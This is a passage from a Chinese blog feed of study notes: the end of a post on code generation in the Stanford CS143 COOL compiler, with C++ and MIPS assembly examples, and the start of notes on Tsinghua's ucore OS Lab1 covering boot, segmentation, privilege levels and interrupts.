- dispatch tables</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding class table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_class_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding object table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_object_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding dispatch tables&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_dispatch_table</span>(str);<span class="hljs-comment">//recursively</span><br><br>  <span class="hljs-comment">// </span><br>  <span class="hljs-comment">// Check that strings required to code the prototype objects are installed.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-built_in">assert</span>(inttable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;0&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(stringtable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(INTNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(STRINGNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(BOOLNAME));<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding prototypes&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_prototype_object</span>(str);<br><br>  <span class="hljs-comment">// /*##*/</span><br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global text&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_text</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - object initializer</span><br><span class="hljs-comment">//                   - the class methods</span><br><span class="hljs-comment">//                   - etc...</span><br>  CgenEnvTopLevelP env = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CgenEnvTopLevel</span>(&amp;class_to_tag_table,<br>     &amp;class_to_max_child_tag_table,<br>     &amp;table_of_method_tables,<br>     num_classes);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding init methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_init</span>(str,env);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_methods</span>(str,env);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><a href="https://kiprey.github.io/2020/06/compiler-learning/#5-cgen-%E7%9B%AE%E6%A0%87%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90">以下部分 出处, 未全cv</a>:</p><ul><li><p>声明全局变量。例如以下mips汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .data<br>  .align  2<br>  .globl  class_nameTab<br>  .globl  Main_protObj<br>  .globl  Int_protObj<br>  .globl  String_protObj<br>  .globl  bool_const0<br>  .globl  bool_const1<br>  .globl  _int_tag<br>  .globl  _bool_tag<br>  .globl  _string_tag<br><br>_int_tag:<br>  .word 3<br>_bool_tag:<br>  .word 4<br>_string_tag:<br>  .word 5<br>  .globl _MemMgr_INITIALIZER<br></code></pre></div></td></tr></table></figure></li><li><p>声明GC器。例如以下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">_MemMgr_INITIALIZER:<br>  .word _NoGC_Init<br>  .globl _MemMgr_COLLECTOR<br>_MemMgr_COLLECTOR:<br>  .word _NoGC_Collect<br>  .globl _MemMgr_TEST<br>_MemMgr_TEST:<br>  .word 0<br>  .word -1<br></code></pre></div></td></tr></table></figure></li><li><p>将常量输出（例如：数字，字符串，布尔常量），例如以下部分汇编代码</p><blockquote><p>数字常量包括<code>0</code>，字符串常量包括空字符串<code>&quot;&quot;</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word -1          # eye catcher for _gc_check<br>str_const8:             # 该字符串的标签<br>  .word 5               # string class tag<br>  .word 6               # size of the class(include 5,6,string_disptab,string and align)/word<br>  .word String_dispTab  # 该类型可以使用的方法<br>  .word int_const2      # 字符串长度（其中的int_const2指向另一个数字常量）<br>  .ascii &quot;Main&quot;         # 字符串的ASCII码<br>  .byte 0               # 字符串末尾的\0终结符<br>  .align 2              # 对齐<br></code></pre></div></td></tr></table></figure></li><li><p>将所有类的名称输出。例如以下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_nameTab:        # 这一个个的str_const都指向特定的字符串<br>  .word str_const6    # str_const6  =&gt; &quot;Object&quot;<br>  .word str_const7    # str_const7  =&gt; &quot;IO&quot;<br>  .word str_const8    # str_const8  =&gt; &quot;Main&quot;<br>  .word str_const9    # str_const9  =&gt; &quot;Int&quot;<br>  .word str_const10   # str_const10 =&gt; &quot;Bool&quot;<br>  .word str_const11   # str_const11 =&gt; &quot;String&quot;<br></code></pre></div></td></tr></table></figure></li><li><p>将所有类中的object table输出（未知用途，删除后仍然可以执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_objTab:<br>  .word  Object_protObj<br>  .word  Object_init<br>  .word  IO_protObj<br>  .word  IO_init<br>  .word  Main_protObj<br>  .word  Main_init<br>  .word  Int_protObj<br>  .word  Int_init<br>  .word  Bool_protObj<br>  .word  Bool_init<br>  .word  String_protObj<br>  .word  String_init<br></code></pre></div></td></tr></table></figure></li><li><p>将每个类所含的方法输出（包括该类的继承类中的方法），例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">Main_dispTab:<br>  .word  Object.abort<br>  .word  Object.type_name<br>  .word  Object.copy<br>  .word  IO.out_string<br>  .word  IO.out_int<br>  .word  IO.in_string<br>  .word  IO.in_int<br>  .word  Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>将每个类的类型信息输出。<code>protObj</code>中含有当前类的属性以及函数表。例如以下部分汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word  -1         # -1 header for the garbage collector(eye catcher for _gc_check)<br>Main_protObj:         # label<br>  .word  2            # class tag<br>  .word  7            # total_attributes + DEFAULT_OBJFIELDS<br>  .word  Main_dispTab # 函数表<br>  .word  int_const0   # 第一个attribute是数字类型<br>  .word  str_const12  # 第二个attribute是字符串类型<br>  .word  bool_const0  # 第三个attribute是布尔类型<br>  .word  0            # 第四个attribute是其他类型，例如各种类<br></code></pre></div></td></tr></table></figure></li><li><p>声明全局代码段的相关信息，例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">#声明堆的相关信息<br>  .globl  heap_start<br>heap_start:<br>  .word  0<br>#声明text代码段<br>  .text<br>  .globl  Main_init<br>  .globl  Int_init<br>  .globl  String_init<br>  .globl  Bool_init<br>  .globl  Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>输出每个类的初始化函数的代码，例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">String_init:<br>  addiu  $sp $sp -12<br>  sw  $fp 12($sp)<br>  sw  $s0 8($sp)<br>  sw  $ra 4($sp)<br>  addiu  $fp $sp 4<br>  move  $s0 $a0<br>  jal  Object_init<br>  move  $a0 $s0<br>  lw  $fp 12($sp)<br>  lw  $s0 8($sp)<br>  lw  $ra 4($sp)<br>  addiu  $sp $sp 12<br>  jr  $ra<br></code></pre></div></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>因为此时已经通过了semant, 可以确定AST是正确的从而<strong>无需检查</strong><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>Stanford-cs143-pdf中提到的<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tsinghua操作系统课程</title>
    <link href="/2021-10/Learning-ucore/"/>
    <url>/2021-10/Learning-ucore/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-BIOS启动顺序"><a href="#1-BIOS启动顺序" class="headerlink" title="1.BIOS启动顺序"></a>1.BIOS启动顺序</h3><ul><li>CPU加电后代码段寄存器初始化为<strong>CS = F000H, EIP = 0000FFF0H</strong>, 然后再计算 Base+IP = FFFF0000H + 0000FFF0H = FFFFFFF0H 得到BIOS的<a href="https://en.wikipedia.org/wiki/EPROM">EPROM</a>(Erasable Programmable Read Only Memory)所在地, 这个地址的第一条指令是一个<strong>长跳转指令</strong>(这样CS和EIP都会更新)到BIOS代码中执行</li><li>BIOS做完计算机硬件自检和初始化后，会选择一个启动设备（例如软盘、硬盘、光盘等），并且读取该设备的第一扇区(即主引导扇区或启动扇区)到内存一个特定的地址0x7c00处，然后CPU控制权会转移到那个地址继续执行。至此BIOS的初始化工作做完了，进一步的工作交给了ucore的<strong>bootloader</strong>。</li></ul><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_1_bios_booting.html#%E8%A1%A5%E5%85%85%E4%BF%A1%E6%81%AF">附</a>:</p><ul><li>在16位的8086 CPU时代，内存限制在1MB范围内，且BIOS的代码固化在EPROM中。在基于Intel的8086 CPU的PC机中的EPROM被编址在1ＭB内存地址空间的最高64KB中。PC加电后，CS寄存器初始化为<strong>0xF000</strong>，IP寄存器初始化为<strong>0xFFF0</strong>, CS:IP=0xF000:0XFFF0（Segment:Offset 表示）=<strong>0xFFFF0</strong>(Linear表示)</li><li>默认将执行BIOS ROM编址在32位内存地址空间的最高端，即位于4GB地址的最后一个64KB内。在PC系统开机复位时，CPU进入实模式，并将CS寄存器设置成0xF000，将它的<strong>shadow register</strong>的<strong>Base</strong>值初始化设置为0xFFFF0000，EIP寄存器初始化设置为0x0000FFF0。所以机器执行的第一条指令的物理地址是<strong>0xFFFFFFF0</strong>。80386的BIOS代码也要和以前8086的BIOS代码兼容，故地址0xFFFFFFF0处的指令还是一条长跳转指令<code>jmp F000:E05B</code>。注意，这个长跳转指令会触发更新CS寄存器和它的shadow register，即执行<code>jmp F000 : E05B</code>后，CS将被更新成0xF000。表面上看CS其实没有变化，但CS的shadow register被更新为另外一个值了，它的Base域被更新成0x000F0000，此时形成的物理地址为Base+EIP=0x000FE05B，这就是CPU执行的第二条指令的地址。此时这条指令的地址已经是1M<strong>以内</strong>了，且此地址不再位于BIOS ROM中，而是位于RAM空间中。由于Intel设计了一种映射机制，将内存高端的BIOS ROM映射到1MB以内的RAM空间里，并且可以使这一段被映射的RAM空间具有与ROM类似的只读属性。所以PC机启动时将开启这种映射机制，让4GB地址空间的最高一个64KB的内容等同于1MB地址空间的最高一个64K的内容，从而使得执行了长跳转指令后，其实是回到了早期的8086 CPU初始化控制流，保证了向下兼容</li></ul><p>例图:</p><img src="https://i.loli.net/2021/11/15/gqzhf1o9HjFSRZd.png" alt="image-20211110102048633"  /><img src="https://i.loli.net/2021/11/15/5smFgYn7Bxhq3Ke.png" alt="image-20211110101314467" style="zoom:67%;" /><h3 id="2-实模式"><a href="#2-实模式" class="headerlink" title="2.实模式"></a>2.实模式</h3><p>参考资料:《Intel 80386 Reference Programmers Manual-i386》, 基本是这个的翻译</p><p>在<strong>bootloader</strong>接手BIOS的工作后，当前的PC系统处于实模式（16位模式）运行状态，在这种状态下软件可访问的物理内存空间不能超过1MB，且无法发挥Intel 80386以上级别的32位CPU的4GB内存管理能力。</p><p>实模式将整个物理内存看成分段的区域，程序代码和数据位于不同区域，操作系统和用户程序并没有区别对待，<strong>而且每一个指针都是指向实际的物理地址</strong>。这样，用户程序的一个指针如果指向了操作系统区域或其他用户程序区域，并修改了内容，那么其后果就很可能是灾难性的。通过修改A20地址线可以完成从实模式到保护模式的转换。有关A20的进一步信息可参考“<a href="http://hengch.blog.163.com/blog/static/107800672009013104623747/">关于A20 Gate</a>”。z</p><img src="https://i.loli.net/2021/11/15/v6fC2e43WESLcaU.png" alt="img" style="zoom: 67%;" /><ul><li><strong>地址<code>0-0x9ffff</code>的640KB内存是DRAM，即插在主板上的内存条。</strong><br>顶部<code>0xf0000-0xfffff</code>的64KB内存是ROM，存放BIOS代码。</li><li>EPROM是通过地址来访问的, 80386将其映射到内存的顶端, 其他的一些外设也同样通过映射到地址空间来访问它们</li></ul><h3 id="3-分段机制-保护模式"><a href="#3-分段机制-保护模式" class="headerlink" title="3.分段机制/保护模式"></a>3.分段机制/保护模式</h3><h4 id="a-保护模式"><a href="#a-保护模式" class="headerlink" title="a.保护模式"></a>a.保护模式</h4><ul><li><p>只有在保护模式下，80386的<strong>全部32根地址线有效</strong>，可寻址高达4G字节的线性地址空间和物理地址空间，可访问64TB（有2^14^个段，每个段最大空间为2^32^字节）的逻辑地址空间，可采用分段存储管理机制和分页存储管理机制。这不仅为存储共享和保护提供了硬件支持，而且为实现虚拟存储提供了硬件支持。通过提供4个特权级和完善的特权检查机制，既能实现资源共享又能保证代码数据的安全及任务的隔离。</p><blockquote><p>【补充】保护模式下，有两个段表：GDT（Global Descriptor Table）和LDT（Local Descriptor Table），每一张段表可以包含8192 (2^13)个描述符[1]，因而最多可以同时存在2 * 2^13 = 2^14^个段。虽然保护模式下可以有这么多段，逻辑地址空间看起来很大，但实际上段并不能扩展物理地址空间，很大程度上各个段的地址空间是<strong>相互重叠</strong>的。目前所谓的64TB（2^(14+32)^=2^46^）逻辑地址空间是一个理论值，没有实际意义。在32位保护模式下，真正的物理空间仍然只有2^32字节那么大。注：在ucore lab中只用到了GDT，没有用LDT。</p><p>Reference: [1] 3.5.1 Segment Descriptor Tables, Intel® 64 and IA-32 Architectures Software Developer’s Manual</p></blockquote></li></ul><h4 id="b-分段机制"><a href="#b-分段机制" class="headerlink" title="b.分段机制"></a>b.分段机制</h4><blockquote><p>b,c,d顺序按照<strong>35</strong>年前的i386文档, 图片来自IA-32文档</p></blockquote><ul><li><p>将内存划分成以起始地址和长度限制这两个二维参数表示的内存块，这些内存块就称之为段（Segment）。编译器把源程序编译成执行程序时用到的代码段、数据段、堆和栈等概念在这里可以与段联系起来，二者在含义上是一致的</p></li><li><p>转换逻辑地址（Logical Address,应用程序员看到的地址）到物理地址（Physical Address, 实际的物理内存地址）分以下两步：</p><p>[1] 分段地址转换：<img src="https://i.loli.net/2021/11/15/2voBNa4eHCJYpDS.png" alt="image-20211110224722534" style="zoom:67%;" /></p><p>[2] 分页地址转换，这一步中把线性地址转换为物理地址。（注意：这一步是可选的，由操作系统决定是否需要。在后续试验中会涉及。</p></li></ul><h4 id="c-Segment-Selector"><a href="#c-Segment-Selector" class="headerlink" title="c.Segment Selector"></a>c.Segment Selector</h4><ul><li>A segment selector is a 16-bit identifier for a segment (see Figure 3-6). It does not point directly to the segment,<br>but instead points to the segment descriptor that defines the segment. </li></ul><img src="https://i.loli.net/2021/11/15/2pZPMgihVI6QSrR.png" alt="image-20211110233814790" style="zoom:67%;" /><h4 id="d-Segment-register"><a href="#d-Segment-register" class="headerlink" title="d.Segment register"></a>d.Segment register</h4><ul><li><p>For virtually any kind of program execution to take place, at least the code-segment (CS), data-segment (DS), and stack-segment (SS) registers must be loaded with valid segment selectors.</p></li><li><p>three additional data-segment registers (ES, FS, and GS) are optional</p><img src="https://i.loli.net/2021/11/15/JX7IuMO4QodfVFK.png" alt="image-20211110232108110" style="zoom: 67%;" /></li><li><p>For a program to access a segment, the segment selector for the segment <strong>must have been loaded in one of the</strong><br><strong>segment registers</strong>. So, although a system can define thousands of segments, <strong>only 6 can be available</strong> for immediate<br>use. </p></li><li><p><strong>shadow register(“hidden” part):</strong></p><p>When a segment selector is loaded into the visible part, the processor also loads the hidden part from the segment descriptor pointed to by the segment selector</p></li></ul><h4 id="e-Segment-Descriptor"><a href="#e-Segment-Descriptor" class="headerlink" title="e.Segment Descriptor"></a>e.Segment Descriptor</h4><blockquote><p><strong>来自IA-32文档 P2902/3-10 Vol. 3A</strong> </p></blockquote><img src="..\..\image\ucore\IxTJPGOZWVjz2BD-16373800575412.png" alt="image-20211110230124631.png" style="zoom:80%;" /><h4 id="f-Global-Descriptor-Tables"><a href="#f-Global-Descriptor-Tables" class="headerlink" title="f.Global Descriptor Tables"></a>f.Global Descriptor Tables</h4><blockquote><p><strong>(IA-32 P2906/ 3-14 Vol. 3A)</strong>:</p></blockquote><p>全局描述符表的是一个保存多个段描述符的“数组”，其起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。由于GDT 不能有GDT本身之内的描述符进行描述定义，所以处理器采用GDTR为GDT这一特殊的系统段。注意，全局描述符表中第一个段描述符设定为空段描述符。GDTR中的段界限以字节为单位。对于含有N个描述符的描述符表的段界限通常可设为8*N-1。</p><img src="https://i.loli.net/2021/11/15/t1iNrJbCeBzASFf.png" alt="image-20211110230336834" style="zoom:67%;" /><h4 id="g-Privilege-Level"><a href="#g-Privilege-Level" class="headerlink" title="g.Privilege Level"></a>g.Privilege Level</h4><ul><li>Current privilege level (<strong>CPL</strong>) — The CPL is the privilege level of the currently executing program or task. <u>It</u><br><u>is stored in bits 0 and 1 of the CS and SS segment registers.</u> Normally, the CPL is equal to the privilege level of<br>the code segment from which instructions are being fetched. The processor changes the CPL when program<br>control is transferred to a code segment with a different privilege level. </li></ul><blockquote><p>The CPL is treated slightly differently when accessing <strong>conforming code segments</strong>. Conforming code segments can be accessed from any privilege level that is equal to or numerically greater (less privileged) than the DPL of the conforming code segment. Also, the CPL is not changed when the processor accesses a conforming code segment that has a different privilege level than the CPL.</p></blockquote><ul><li>Descriptor privilege level (<strong>DPL</strong>) — The DPL is the privilege level of a segment or gate. It is stored in the DPL<br>field of the segment or gate descriptor for the segment or gate. </li><li>Requested privilege level (<strong>RPL</strong>) — The RPL is an override privilege level that is assigned to segment<br>selectors. It is stored in bits 0 and 1 of the segment selector. The RPL can be used to ensure that privileged code<br>does not access a segment on behalf of an application program unless the program itself has access privileges for<br>that segment. See Section 5.10.4, “Checking Caller Access Privileges (ARPL Instruction),” for a detailed description of<br>the purpose and typical use of the RPL.</li></ul><p><strong>PRIVILEGE CHECK:</strong> </p><p><img src="https://i.loli.net/2021/11/16/JGd27NnTwFDipOe.jpg" alt="img"></p><h3 id="4-中断与异常"><a href="#4-中断与异常" class="headerlink" title="4.中断与异常"></a>4.中断与异常</h3><ul><li>中断机制给操作系统提供了处理意外情况的能力，同时它也是实现进程/线程抢占式调度的一个重要基石。但中断的引入导致了对操作系统的理解更加困难。</li><li>在操作系统中，有三种特殊的中断事件。<ul><li>由CPU<em>外部设备引起的</em> 外部事件如I/O中断、时钟中断、控制台中断等是异步产生的（即产生的时刻不确定），与CPU的执行无关，我们称之为<strong>异步中断</strong>(asynchronous interrupt)也称外部中断,简称<strong>中断</strong>(interrupt)。</li><li>而把在CPU执行指令期间检测到<em>不正常的或非法</em> 的条件(如除零错、地址访问越界)所引起的内部事件称作<strong>同步中断</strong>(synchronous interrupt)，也称内部中断，简称**异常(**exception)。</li><li>把在程序中使用<em>请求系统服务</em> 的系统调用而引发的事件，称作<strong>陷入中断</strong>(trap interrupt)，也称<strong>软中断</strong>(soft interrupt)，系统调用(system call)简称<strong>trap</strong>。在后续试验中会进一步讲解系统调用。</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/5HxAC9w4XSiasbK.png"  style="zoom: 60%;" /><ul><li><p><strong>Interrupt Descriptor Table</strong>:同GDT一样，IDT是一个8字节的描述符数组，但IDT的第一项可以包含一个描述符。CPU把中断（异常）号乘以8做为IDT的索引。IDT可以位于内存的任意位置，CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址。指令LIDT和SIDT用来操作IDTR。两条指令都有一个显示的操作数：一个6字节表示的内存地址(包含线性地址基址和界限)。</p><p>在保护模式下，最多会存在256个Interrupt/Exception Vectors。</p><p>范围[0，31]内的32个向量被异常Exception和NMI使用，但当前并非所有这32个向量都已经被使用，有几个当前没有被使用的，请不要擅自使用它们，它们被保留，以备将来可能增加新的Exception。</p><p>范围[32，255]内的向量被保留给用户定义的Interrupts。Intel没有定义，也没有保留这些Interrupts。用户可以将它们用作外部I/O设备中断（8259A IRQ），或者系统调用（System Call 、Software Interrupts）等。</p></li><li><p><strong>IDT gate descriptors</strong>: Interrupts/Exceptions应该使用Interrupt Gate和Trap Gate，它们之间的唯一区别就是：当调用Interrupt Gate时，Interrupt会被CPU自动禁止；而调用Trap Gate时，CPU则不会去禁止或打开中断，而是保留它原来的样子。</p><blockquote><p>【补充】所谓“自动禁止”，指的是CPU跳转到interrupt gate里的地址时，在将EFLAGS保存到栈上之后，清除EFLAGS里的IF位，以避免重复触发中断。在中断处理例程里，操作系统可以将EFLAGS里的IF设上,从而允许嵌套中断。但是必须在此之前做好处理嵌套中断的必要准备，如保存必要的寄存器等。二在ucore中访问Trap Gate的目的是为了实现系统调用。用户进程在正常执行中是不能禁止中断的，而当它发出系统调用后，将通过Trap Gate完成了从用户态（ring 3）的用户进程进了核心态（ring 0）的OS kernel。如果在到达OS kernel后禁止EFLAGS里的IF位，第一没意义（因为不会出现嵌套系统调用的情况），第二还会导致某些中断得不到及时响应，所以调用Trap Gate时，CPU则不会去禁止中断。总之，interrupt gate和trap gate之间没有优先级之分，仅仅是CPU在处理中断时有不同的方法，供操作系统在实现时根据需要进行选择。</p></blockquote></li><li><p>在IDT中，可以包含如下3种类型的Descriptor：</p><ul><li>Task-gate descriptor （这里没有使用）</li><li>Interrupt-gate descriptor （中断方式用到）</li><li>Trap-gate descriptor（系统调用用到）</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/qbyzSN56w9eDHKX.png" alt="image-20211116161700420" style="zoom:70%;" /><p>​    Interrrupt Gate and Trap Gate 和Call Gate非常相似, 不同的Gate用3bit的Type来表示:</p><img src="https://s2.loli.net/2021/12/20/FOG4zJsyutojfen.png" alt="image-20211209164600135" style="zoom:67%;" /><h4 id="由硬件完成的工作"><a href="#由硬件完成的工作" class="headerlink" title="由硬件完成的工作"></a>由硬件完成的工作</h4><ul><li><p>硬件中断处理过程1（==起始==）：从CPU收到中断事件后，打断当前程序或任务的执行，根据某种机制跳转到中断服务例程去执行的过程。其具体流程如下：</p><ul><li>CPU在执行完当前程序的每一条指令后，都会去确认在执行刚才的指令过程中中断控制器（如：<a href="https://blog.csdn.net/longintchar/article/details/79439466">8259A</a>）是否发送中断请求过来，如果有那么CPU就会在相应的时钟脉冲到来时从总线上读取中断请求对应的中断向量；</li><li>CPU根据得到的中断向量（以此为索引）到IDT中找到该向量对应的中断描述符，中断描述符里保存着中断服务例程的段选择子；</li><li>CPU使用IDT查到的中断服务例程的段选择子从**GDT(这几个表一定要去分开来, 现在这个是指寻址的段描述符表)**中取得相应的段描述符，段描述符里保存了中断服务例程的段基址和属性信息，此时CPU就得到了中断服务例程的起始地址</li></ul><p>以上三个过程示意图: <a href='#ipc' id='ipc_r'>link</a> </p><ul><li>CPU会根据CPL和中断服务例程的段描述符的DPL信息确认是否发生了特权级的转换。比如当前程序正运行在用户态，而中断程序是运行在内核态的，则意味着发生了特权级的转换，这时CPU会从当前程序的<strong>TSS</strong>信息（该信息在内存中的起始地址存在TR寄存器中）里取得该程序的内核栈地址，即包括内核态的ss和esp的值，<strong>并立即将系统当前使用的栈切换成新的内核栈。</strong>这个栈就是即将运行的中断服务程序要使用的栈。紧接着就将当前程序使用的用户态的ss和esp压到新的内核栈中保存起来；</li><li>CPU需要开始保存当前被打断的程序的现场（即一些寄存器的值），以便于将来恢复被打断的程序继续执行。这需要利用内核栈来保存相关现场信息，即依次压入当前被打断程序使用的eflags，cs，eip，errorCode（如果是有错误码的异常）信息；</li><li>CPU利用中断服务例程的段描述符将其第一条指令的地址加载到cs和eip寄存器中，开始执行中断服务例程。这意味着先前的程序被暂停执行，中断服务程序正式开始工作。</li></ul></li></ul><hr><ul><li><p>硬件中断处理过程2（==结束==）：中断处理工作完成后需要通过iret（或iretd）指令恢复被打断的程序的执行。CPU执行IRET指令的具体过程如下：</p><ul><li>程序执行这条iret指令时，首先会从内核栈里弹出先前保存的被打断的程序的现场信息，即eflags，<code>cs</code>，eip重新开始执行；</li><li>如果存在特权级转换（<code>CS(CPL)&gt;DPL</code>），则还需要从内核栈中弹出用户态栈的ss和esp，这样也意味着栈也被切换回原先使用的用户态的栈了；</li><li>如果此次处理的是带有错误码（errorCode）的异常，CPU在恢复先前程序的现场时，并不会弹出errorCode。这一步需要通过软件完成，即要求相关的中断服务例程在调用iret返回之前添加出栈代码主动弹出errorCode。</li></ul></li></ul><p><a href='#ipc_r' id='ipc'><img src="https://i.loli.net/2021/11/16/hGLAjlTYVSWpk67.png" alt="image-20211116161700420" style="zoom:70%;" /></a></p><h4 id="特权级检查"><a href="#特权级检查" class="headerlink" title="特权级检查"></a>特权级检查</h4><ul><li><p>中断处理得==特权级转换==是通过门描述符（gate descriptor）和相关指令来完成的。一个门描述符就是一个系统类型的段描述符，一共有4个子类型：</p><ul><li>调用门描述符（call-gate descriptor may reside in the GDT or in an LDT, but not in the interrupt descriptor table (IDT)），</li><li>中断门描述符（interrupt-gate descriptor）</li><li>陷阱门描述符（trap-gate descriptor）</li><li>任务门描述符（task-gate descriptor）。</li></ul><p>Task gates are used for task switching and are discussed in Chapter 7, “Task Management”. Trap and interrupt<br>gates are special kinds of call gates used for calling exception and interrupt handlers。中断门描述符和陷阱门描述符几乎是一样的。</p><ul><li>中断发生时实施特权检查的过程如下图所示：</li></ul><img src="https://i.loli.net/2021/11/16/fqGtF4SHxWPCJhg.png" alt="这里是图片描述" style="zoom:80%;" 